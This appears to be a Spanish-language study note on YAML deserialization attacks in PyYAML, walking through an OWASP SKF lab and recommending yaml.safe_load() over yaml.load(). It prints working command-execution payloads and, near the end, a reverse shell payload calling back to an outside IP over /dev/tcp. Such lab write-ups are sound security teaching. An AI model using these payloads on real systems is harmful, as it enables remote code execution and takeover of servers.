------
- Tags: #deserializacion #ataque
----
# Definición

> Un **Ataque de Deserialización Yaml** (**DES-Yaml**) es un tipo de vulnerabilidad que puede ocurrir en aplicaciones Python que usan **YAML** (**Yet Another Markup Language**) para serializar y deserializar objetos.

**PyYAML** es una biblioteca en Python que permite trabajar con archivos YAML, proporcionando funciones para serializar (guardar) y deserializar (cargar) datos en formato YAML. PyYAML convierte datos YAML en estructuras de datos de Python, como diccionarios, listas y otros tipos, y también permite generar archivos YAML a partir de objetos Python.

La vulnerabilidad se produce cuando un atacante es capaz de controlar la entrada YAML que se pasa a una función de deserialización en la aplicación. Si el código de la aplicación no valida adecuadamente la entrada YAML, puede permitir que un atacante inyecte código malicioso en el objeto deserializado.

Una vez que el objeto ha sido deserializado, el código malicioso puede ser ejecutado en el contexto de la aplicación, lo que puede permitir al atacante tomar el control del sistema, acceder a datos sensibles, o incluso ejecutar código remoto.

Los atacantes pueden aprovecharse de las vulnerabilidades de DES-Yaml para realizar ataques de denegación de servicio (DoS), inyectar código malicioso, o incluso tomar el control completo del sistema.

El impacto de un Ataque de Deserialización Yaml depende del tipo y la sensibilidad de los datos que se puedan obtener, pero puede ser muy grave. Por lo tanto, es importante que los desarrolladores de aplicaciones Python validen y filtren adecuadamente la entrada YAML que se pasa a las funciones de deserialización, y que utilicen técnicas de seguridad como la limitación de recursos para prevenir ataques DoS y la desactivación de la deserialización automática de objetos no confiables.

-----
# Explotación de DES-Yaml en laboratorio

Utilizaremos el laboratorio de **skf-labs** de Github

- ``docker pull blabla1337/owasp-skf-lab:des-yaml``
- ``docker run -dit -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:des-yaml``

-------

La web como tal se vería de esta manera, pero particularmente lo que mas nos llama la atención es la cadena que aparece en la **URL**, la cual por su estructura parece ser **Base64**

![[yaml 1.png]]

Si lo decodificamos veríamos esto

![[yaml 2.png]]

Esa primera cadena que dice ``yaml:`` es el formato que suelen poseer los archivos **Yaml**.

------

Si nos metemos dentro del contenedor y hacemos un ``cat`` del archivo **DES.py**, veremos una sección particular donde podemos identificar **la falta de sanitización**.

![[yaml 3.png]]

El principal problema es el uso de la función `yaml.load()` sin restricciones, ya que carga cualquier contenido YAML sin validación, lo que puede permitir a un atacante inyectar código malicioso.

La función `yaml.load()` de la librería PyYAML carga y deserializa el contenido de un archivo YAML en objetos Python. Si el atacante envía una entrada YAML maliciosa, puede desencadenar la ejecución de código arbitrario en el servidor.
Por ejemplo, un atacante podría enviar un payload que use la capacidad de YAML de ejecutar objetos Python como `!!python/object/apply:os.system`, permitiendo **ejecutar comandos del sistema**.

- `!!python/object/apply:os.system ["ls"]`

Para evitar la ejecución de código malicioso, es preferible usar `yaml.safe_load()` en lugar de `yaml.load()`. La función `safe_load()` deserializa datos YAML **sin permitir la creación de objetos arbitrario**s, lo que reduce la superficie de ataque.

------

Por lo tanto como se está empleando una mala sanitización, podríamos colocar una **cadena maliciosa**, para esto nos apoyaremos del [foro](https://www.pkmurphy.com.au/isityaml/) de **Peter Murphy**

- ``yaml: !!python/object/apply:subprocess.check_output ['ls']``

Esta cadena debemos guardarla en un archivo, para luego codificarla en **Base64**, ya que recordemos que estos objetos serializados viajan en formato B64.

![[yaml 4.png]]

Ahora coloquemos esta cadena en la web para que **nos la interprete** y tener la respuesta del comando ``ls``

![[yaml 5.png]]

De esta manera habríamos efectuado el **Deserialization Attack Yaml**.

Aportes para multitud de comandos extra como una **Reverse Shell**:

- ``yaml: !!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/192.168.0.194/443 0>&1'"]``

 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/YAML.md